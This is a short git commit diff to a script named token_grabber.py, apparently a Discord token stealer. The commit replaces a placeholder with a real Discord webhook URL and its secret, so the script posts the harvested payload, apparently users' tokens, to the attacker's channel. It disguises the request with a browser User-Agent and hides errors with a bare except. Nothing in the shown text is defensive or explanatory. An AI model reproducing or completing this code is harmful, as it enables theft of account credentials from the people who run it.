215bcb5a48c3f6dc81b9476487e1f5df46bddfe4
clockworks4000 <115667659+clockworks4000@users.noreply.github.com>
2022-11-24 14:54:01 -0500

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1045426751242776756/KQAz9dnyo_S0_Ft8zu9ZA4L1Cb2_0RFYrrz3rYc7crffZnd5dRpiLfO9Fwb7zQcwOKql', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
